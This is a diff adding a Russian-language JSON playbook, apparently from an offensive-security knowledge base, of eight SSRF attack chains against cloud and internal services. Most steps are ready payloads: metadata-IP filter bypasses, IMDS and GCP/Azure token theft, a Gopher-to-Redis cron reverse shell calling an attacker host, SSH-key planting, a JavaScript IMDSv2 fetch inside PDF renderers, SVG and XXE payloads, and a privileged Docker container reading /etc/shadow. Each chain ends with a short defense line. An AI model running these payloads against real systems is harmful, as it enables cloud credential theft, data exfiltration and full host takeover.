@@ -1,0 +1,443 @@
+{
+  "domain": "SSRF",
+  "domainLabel": "SSRF → облако",
+  "domainOrder": 4,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "SSRF → метаданные AWS: кража IAM-кредов и дамп S3",
+      "level": "newbie",
+      "impact": "Временные IAM-креды роли инстанса (AccessKeyId/SecretAccessKey/Token), чтение всех доступных роли S3-бакетов, RDS-снапшотов и секретов, пивот по аккаунту через STS. Capital One слил 100M+ записей; на BBP такие отчёты платят.",
+      "why": "Один неавторизованный GET (или связка PUT+GET для IMDSv2) превращает безобидный image/URL-прокси в ключи от AWS-аккаунта.",
+      "precondition": "Серверный фетчер (image-прокси, WAF/reverse-proxy, параметр-URL) на EC2/ECS с прикреплённой ролью; включён IMDSv1 ЛИБО SSRF позволяет управлять методом и заголовками (тогда достаётся и IMDSv2).",
+      "tags": [
+        "ssrf",
+        "aws",
+        "imds",
+        "metadata",
+        "s3",
+        "credential-theft"
+      ],
+      "realWorld": "Утечка Capital One 2019 (WAF SSRF → IMDSv1 → S3, 100M+ записей); Yassine Aboukir 'Exploitation of an SSRF vulnerability against EC2 IMDSv2'.",
+      "defense": "Принудительный IMDSv2 с hop-limit 1, least-privilege для ролей инстансов, блок egress на 169.254.169.254 на уровне приложения.",
+      "steps": [
+        {
+          "title": "Подтверждаем, что SSRF достаёт link-local",
+          "kind": "note",
+          "q": "",
+          "detail": "GET http://169.254.169.254/latest/meta-data/  (ждём ami-id/hostname и низкую задержку)",
+          "success": "вернулись ami-id/hostname, отклик быстрый"
+        },
+        {
+          "title": "Обходим наивные фильтры IP",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "http://[::ffff:169.254.169.254]/ , decimal http://2852039166/ , octal http://0251.0376.0251.0376/ , alias http://instance-data/latest/meta-data/"
+        },
+        {
+          "title": "Забираем креды через IMDSv1",
+          "kind": "note",
+          "detail": "GET /latest/meta-data/iam/security-credentials/  затем  GET /latest/meta-data/iam/security-credentials/<ROLE>",
+          "success": "JSON с AccessKeyId/SecretAccessKey/Token"
+        },
+        {
+          "title": "Пробиваем IMDSv2 через PUT-токен",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "PUT /latest/api/token  с X-aws-ec2-metadata-token-ttl-seconds: 21600 , затем GET кредов с X-aws-ec2-metadata-token: <token>"
+        },
+        {
+          "title": "Подгружаем и проверяем креды",
+          "kind": "note",
+          "detail": "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... ; aws sts get-caller-identity"
+        },
+        {
+          "title": "Монетизируем роль",
+          "kind": "note",
+          "detail": "aws s3 ls ; aws s3 sync s3://<bucket> . ; aws secretsmanager list-secrets ; aws rds describe-db-snapshots"
+        },
+        {
+          "title": "Тот же триггер на других облаках",
+          "kind": "note",
+          "q": "",
+          "detail": "Alibaba http://100.100.100.200/latest/meta-data/ ; DigitalOcean http://169.254.169.254/metadata/v1/user-data (часто с секретами)"
+        }
+      ]
+    },
+    {
+      "title": "Gopher → Redis: слепой SSRF пишет себе cron-reverse-shell",
+      "level": "advanced",
+      "impact": "Неавторизованный RCE от имени redis/web-пользователя на внутреннем хосте, обычно с последующей кражей IMDS-кредов того же хоста. Цепочки 'внутренний сервис → RCE' стабильно платят.",
+      "why": "gopher:// превращает URL-фетчер в сырой TCP-сокет, поэтому полностью слепой SSRF говорит на протоколе Redis RESP и пишет строку в crontab.",
+      "precondition": "SSRF поддерживает gopher:// (или dict://); внутренний Redis на 6379 без auth / с выключенным protected-mode и записываемым путём cron, SSH или webroot.",
+      "tags": [
+        "ssrf",
+        "gopher",
+        "redis",
+        "rce",
+        "blind-ssrf"
+      ],
+      "realWorld": "Gopherus (tarunkant); Assetnote 'A Glossary of Blind SSRF Chains'.",
+      "defense": "requirepass + protected-mode, биндинг Redis только на loopback, вырезать схемы gopher:// и dict:// в allowlist фетчера.",
+      "steps": [
+        {
+          "title": "Снимаем отпечаток сервиса",
+          "kind": "note",
+          "q": "",
+          "detail": "dict://127.0.0.1:6379/INFO  или  gopher://127.0.0.1:6379/_PING  (ждём +PONG)",
+          "success": "+PONG или вывод INFO"
+        },
+        {
+          "title": "Генерируем gopher-пейлоад",
+          "kind": "script",
+          "q": "gopher:// SSRF payload generator (Redis RCE / SMTP)",
+          "detail": "Gopherus --exploit redis  (cronjob | sshkey | php-webshell)"
+        },
+        {
+          "title": "Пишем cron-reverse-shell",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "gopher://127.0.0.1:6379/_ + URL-encoded RESP: CONFIG SET dir /var/spool/cron/ ; CONFIG SET dbfilename root ; SET x \"\\n*/1 * * * * bash -i >& /dev/tcp/<ATK>/4444 0>&1\\n\" ; SAVE"
+        },
+        {
+          "title": "Альтернатива: кладём SSH-ключ",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "CONFIG SET dir /root/.ssh/ ; CONFIG SET dbfilename authorized_keys ; SET x \"<attacker-pubkey>\" ; SAVE"
+        },
+        {
+          "title": "Альтернатива: грузим вредоносный модуль",
+          "kind": "note",
+          "q": "",
+          "detail": "MODULE LOAD /tmp/exp.so  (если можно залить файл; работает и против protected-mode-aware Redis)"
+        },
+        {
+          "title": "Ловим shell",
+          "kind": "note",
+          "detail": "nc -lvnp 4444"
+        },
+        {
+          "title": "Тот же трюк на Memcached",
+          "kind": "note",
+          "q": "",
+          "detail": "gopher://127.0.0.1:11211/_ с set/stats для чтения или отравления кэша"
+        }
+      ]
+    },
+    {
+      "title": "DNS-ребиндинг TOCTOU: проходим allowlist прямо в IMDS",
+      "level": "advanced",
+      "impact": "Обходит SSRF-фильтры типа 'резолвим, потом проверяем', достаёт 169.254.169.254 и крадёт IAM-креды даже когда приложение явно блокирует metadata-IP.",
+      "why": "Имя хоста на момент проверки указывает на безобидный публичный IP, а через миллисекунду на запросе уже на 169.254.169.254: один URL, два разных ответа.",
+      "precondition": "Фетчер валидирует резолвнутый IP, затем повторно резолвит на реальном запросе (классический TOCTOU); атакующий управляет авторитативным DNS своего домена.",
+      "tags": [
+        "ssrf",
+        "dns-rebinding",
+        "toctou",
+        "filter-bypass",
+        "imds"
+      ],
+      "realWorld": "Singularity of Origin (NCC Group); свежие CVE в Craft CMS (CVE-2026-27127), FastGPT, Postiz, Budibase повторяют этот TOCTOU-паттерн.",
+      "defense": "Резолвить один раз и коннектиться ровно на этот pinned-IP, отвергать link-local/private после резолва, отключить HTTP-редиректы.",
+      "steps": [
+        {
+          "title": "Поднимаем ребиндер",
+          "kind": "note",
+          "detail": "Singularity of Origin (NCC Group), или <pubIP>.<metaIP>.rbndr.us с TTL 0"
+        },
+        {
+          "title": "Проходим проверку IP",
+          "kind": "payload",
+          "q": "DNS Rebinding",
+          "detail": "submit http://attacker.rebind.tld/latest/meta-data/iam/security-credentials/  (первая A-запись = безобидный публичный IP)"
+        },
+        {
+          "title": "Переключаем DNS-запись",
+          "kind": "note",
+          "q": "",
+          "detail": "авторитативный DNS теперь отвечает 169.254.169.254 до второго резолва"
+        },
+        {
+          "title": "Садимся на metadata",
+          "kind": "note",
+          "detail": "фетчер коннектится на 169.254.169.254; снимаем role + IAM creds как в цепочке SSRF → метаданные AWS"
+        },
+        {
+          "title": "Вариант с мультиответом DNS",
+          "kind": "payload",
+          "q": "DNS Rebinding",
+          "detail": "вернуть в одном A-record и 1.2.3.4, и 169.254.169.254, чтобы клиент выбрал link-local"
+        }
+      ]
+    },
+    {
+      "title": "HTML-в-PDF рендер печатает твои AWS-ключи на первой странице",
+      "level": "intermediate",
+      "impact": "Слепой/полуслепой SSRF, где ответ metadata рендерится прямо в сгенерированный PDF; чтение локальных файлов и IMDS-кредов. Один публичный кейс заплатил.",
+      "why": "Движок PDF на headless Chrome исполняет атакующий JavaScript, поэтому сам делает связку PUT+токен для IMDSv2 и рисует креды прямо в документе.",
+      "precondition": "Приложение рендерит подконтрольный HTML или URL в PDF (инвойсы, отчёты, резюме) через wkhtmltopdf / Puppeteer / headless Chrome.",
+      "tags": [
+        "ssrf",
+        "pdf",
+        "wkhtmltopdf",
+        "headless-chrome",
+        "imds",
+        "file-read"
+      ],
+      "realWorld": "Sadeghipour & Brocious, DEF CON 27 'Owning the Clout through SSRF and PDF Generators'; 'From $0 to $14,000: blind SSRF in a PDF generator'.",
+      "defense": "Рендерить с --disable-local-file-access и выключенным JS, песочница рендера без IAM-роли и с deny egress на link-local.",
+      "steps": [
+        {
+          "title": "Определяем движок рендера",
+          "kind": "note",
+          "q": "",
+          "detail": "читаем поле Producer в PDF: Skia/PDF = headless Chromium, \"wkhtmltopdf\" = Qt WebKit"
+        },
+        {
+          "title": "Чтение локальных файлов (wkhtmltopdf)",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "<iframe src=\"file:///etc/passwd\" width=1000 height=1000>",
+          "success": "содержимое /etc/passwd в готовом PDF"
+        },
+        {
+          "title": "Бьём прямо по metadata",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">"
+        },
+        {
+          "title": "IMDSv2 через JS в headless Chrome",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "<script>fetch('http://169.254.169.254/latest/api/token',{method:'PUT',headers:{'X-aws-ec2-metadata-token-ttl-seconds':'60'}}).then(r=>r.text()).then(t=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>',{headers:{'X-aws-ec2-metadata-token':t}})).then(r=>r.text()).then(d=>document.body.innerText=d)</script>"
+        },
+        {
+          "title": "Читаем добычу",
+          "kind": "note",
+          "q": "",
+          "detail": "открыть полученный PDF; содержимое файла / креды напечатаны на странице"
+        },
+        {
+          "title": "Пивотим с кредами",
+          "kind": "note",
+          "detail": "aws sts get-caller-identity ; aws s3 sync s3://<bucket> ."
+        }
+      ]
+    },
+    {
+      "title": "Отравленная аватарка: SSRF через SVG <image> в пайплайне превью",
+      "level": "intermediate",
+      "impact": "SSRF через загруженную картинку, которую серверный растеризатор сам фетчит, вытягивая IMDS-креды или внутренние страницы в пиксели готового превью.",
+      "why": "Поверхность атаки это безобидная загрузка аватарки, а канал эксфильтрации это сама отрендеренная превьюшка.",
+      "precondition": "Сервер растеризует загруженный SVG или обрабатывает картинки через ImageMagick/librsvg/headless-браузер без отключения внешних ссылок.",
+      "tags": [
+        "ssrf",
+        "svg",
+        "imagemagick",
+        "image-processing",
+        "xxe",
+        "imds"
+      ],
+      "realWorld": "ImageTragick (CVE-2016-3714) и множество баунти по SSRF через SVG-аватарки.",
+      "defense": "Отключить кодеры url/https/msl в policy.xml ImageMagick, вырезать внешние ссылки из SVG, растеризовать с отключённой сетью.",
+      "steps": [
+        {
+          "title": "SVG со ссылкой на удалённую картинку",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" height=\"500\" width=\"500\"/></svg>"
+        },
+        {
+          "title": "Кодер url/MSL в ImageMagick",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "upload exploit.mvg/.svg: image over 0,0 0,0 'url:http://169.254.169.254/latest/meta-data/' (ImageTragick family)"
+        },
+        {
+          "title": "Когда цели нужен заголовок",
+          "kind": "note",
+          "q": "",
+          "detail": "image-фетчеры не могут добавить Metadata-Flavor; используй header-free legacy endpoint GCP (см. цепочку GCP)"
+        },
+        {
+          "title": "Достаём ответ из картинки",
+          "kind": "note",
+          "q": "",
+          "detail": "скачать сгенерированный thumbnail; OCR или осмотреть встроенный текст с телом metadata"
+        },
+        {
+          "title": "Бонус XXE на XML-парсерах",
+          "kind": "payload",
+          "q": "XXE Injection",
+          "detail": "<!DOCTYPE x [<!ENTITY e SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>"
+        }
+      ]
+    },
+    {
+      "title": "Кража kube-env: SSRF к метаданным GCP → сертификаты kubelet → root на каждом поде",
+      "level": "advanced",
+      "impact": "Угоняем OAuth-токен сервис-аккаунта ноды И креды kubelet из kube-env, получая захват kubelet/кластера и root по всему GKE-флоту. Shopify заплатил.",
+      "why": "Один SSRF читает kube-env (внутри лежит приватный TLS-ключ kubelet) и бутстрапит полностью привилегированную identity ноды на весь кластер.",
+      "precondition": "Ворклоад на GCE/GKE с дефолтным доступом к метаданным; metadata concealment / Workload Identity не включены.",
+      "tags": [
+        "ssrf",
+        "gcp",
+        "metadata",
+        "kubernetes",
+        "gke",
+        "kube-env",
+        "kubelet"
+      ],
+      "realWorld": "Shopify HackerOne #341876 'SSRF in Exchange leads to ROOT access in all instances' ($25k).",
+      "defense": "Включить GKE Workload Identity + metadata concealment, ограничить доступ к атрибуту kube-env.",
+      "steps": [
+        {
+          "title": "Забираем токен сервис-аккаунта",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  с заголовком Metadata-Flavor: Google",
+          "success": "JSON с access_token"
+        },
+        {
+          "title": "Обход без заголовка",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "если заголовки нельзя выставить: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token (legacy, без заголовка)"
+        },
+        {
+          "title": "Крадём креды kubelet",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "GET .../computeMetadata/v1/instance/attributes/kube-env  ->  extract CA_CERT, KUBELET_CERT, KUBELET_KEY"
+        },
+        {
+          "title": "Используем OAuth-токен",
+          "kind": "note",
+          "detail": "curl -H \"Authorization: Bearer <token>\" https://storage.googleapis.com/storage/v1/b?project=<id>"
+        },
+        {
+          "title": "Собираем kubeconfig ноды",
+          "kind": "note",
+          "detail": "собрать kubeconfig из сертификатов kube-env -> ходить в API server, читать все secrets, exec в поды"
+        },
+        {
+          "title": "Прямой пивот через kubelet",
+          "kind": "note",
+          "q": "",
+          "detail": "внутренний https://<node>:10250/run/... (exec) или read-only http://<node>:10255/pods"
+        }
+      ]
+    },
+    {
+      "title": "Azure multi-audience: один вызов IMDS, токены для ARM + Key Vault + Graph",
+      "level": "advanced",
+      "impact": "Токены managed identity для management.azure.com (deploy/runCommand = RCE на VM), vault.azure.net (дамп секретов) и graph.microsoft.com (директория) с эскалацией до захвата resource-group или подписки.",
+      "why": "Один и тот же endpoint метаданных чеканит токены под разные resource=аудитории, поэтому единственный SSRF пивотит от RCE к секретам и к Entra ID.",
+      "precondition": "SSRF на Azure VM или App Service с system/user-assigned managed identity, у которой есть хоть какая-то RBAC-роль.",
+      "tags": [
+        "ssrf",
+        "azure",
+        "imds",
+        "managed-identity",
+        "arm",
+        "key-vault",
+        "entra-id"
+      ],
+      "realWorld": "CyberCX 'Azure SSRF Metadata'; Guardz 'Exploiting Azure Managed Identity Tokens from IMDS'.",
+      "defense": "Managed identity по least-privilege (без сплошного Contributor), ограничить egress на IMDS, алерт на runCommand и нетипичные аудитории токенов.",
+      "steps": [
+        {
+          "title": "Чеканим ARM-токен",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  с заголовком Metadata: true",
+          "success": "JSON с access_token (aud=management.azure.com)"
+        },
+        {
+          "title": "Оцениваем радиус поражения",
+          "kind": "note",
+          "detail": "curl -H \"Authorization: Bearer <arm>\" https://management.azure.com/subscriptions?api-version=2020-01-01"
+        },
+        {
+          "title": "RCE через runCommand (Contributor)",
+          "kind": "note",
+          "detail": "POST .../virtualMachines/<vm>/runCommand?api-version=2023-03-01  body {\"commandId\":\"RunShellScript\",\"script\":[\"id;curl ...\"]}"
+        },
+        {
+          "title": "Переключаемся на аудиторию Key Vault",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "перезапросить токен с resource=https://vault.azure.net  затем GET https://<vault>.vault.azure.net/secrets?api-version=7.4"
+        },
+        {
+          "title": "Переключаемся на аудиторию Graph",
+          "kind": "payload",
+          "q": "Server Side Request Forgery",
+          "detail": "resource=https://graph.microsoft.com  ->  enumerate/escalate в Entra ID, если у MI есть directory roles"
+        },
+        {
+          "title": "Особенность App Service",
+          "kind": "note",
+          "q": "",
+          "detail": "там endpoint это $IDENTITY_ENDPOINT с заголовком X-IDENTITY-HEADER: $IDENTITY_HEADER, а не 169.254.169.254"
+        }
+      ]
+    },
+    {
+      "title": "Спящий SSRF: хранимый webhook-URL, который внутренний воркер шлёт в Docker-сокет",
+      "level": "advanced",
+      "impact": "Second-order SSRF достаёт Docker Engine API (tcp 2375) и запускает привилегированный контейнер с монтированием /, давая root-RCE на хосте.",
+      "why": "Пейлоад хранимый (webhook-таргет, link-unfurl/oEmbed, URL аватарки) и детонирует позже из доверенного внутреннего job-раннера, у которого Docker торчит во внутреннюю сеть.",
+      "precondition": "Хранимый URL, который позже фетчится сервером с поддержкой gopher://; внутренний Docker API на tcp 2375 без аутентификации (или Consul/etcd как бэкенд).",
+      "tags": [
+        "ssrf",
+        "second-order",
+        "stored-ssrf",
+        "gopher",
+        "docker",
+        "consul",
+        "rce"
+      ],
+      "realWorld": "kernelpicnic 'Pivoting from blind SSRF to RCE with HashiCorp Consul'; PT SWARM Docker API 2375 RCE; Cherny 'Well, That Escalated Quickly' (Black Hat US-17).",
+      "defense": "Никогда не выставлять Docker на 2375 (TLS + права сокета), биндить Consul на loopback с -enable-local-script-checks=false, ревалидировать хранимые URL на момент фетча, дропать gopher://.",
+      "steps": [
+        {
+          "title": "Закладываем хранимый URL",
+          "kind": "note",
+          "q": "",
+          "detail": "выставить webhook / oEmbed-unfurl / profile URL на свой gopher-пейлоад; ждать async-воркер (так же достаёт внутренние админ-панели)"
+        },
+        {
+          "title": "Проверяем, что Docker слушает",
+          "kind": "note",
+          "q": "",
+          "detail": "gopher://127.0.0.1:2375/_GET /version HTTP/1.1\\r\\nHost:x\\r\\n\\r\\n  ->  Docker version banner"
+        },
+        {
+          "title": "Создаём привилегированный контейнер",
+          "kind": "note",
+          "q": "",
+          "detail": "gopher POST /containers/create JSON {\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"...\"],\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}"
+        },
+        {
+          "title": "Стартуем и пишем на хост",
+          "kind": "note",
+          "q": "",
+          "detail": "gopher POST /containers/<id>/start  затем /exec  ->  положить SSH-ключ или reverse shell под /host"
+        },
+        {
+          "title": "Прямой эквивалент одной командой",
+          "kind": "note",
+          "detail": "docker -H tcp://<host>:2375 run --rm --privileged -v /:/mnt alpine chroot /mnt sh -c 'id; cat /mnt/etc/shadow'"
+        },
+        {
+          "title": "Альтернатива на Consul",
+          "kind": "note",
+          "q": "",
+          "detail": "PUT /v1/agent/service/register с script health check command (когда script checks включены) для RCE"
+        }
+      ]
+    }
+  ]
+}
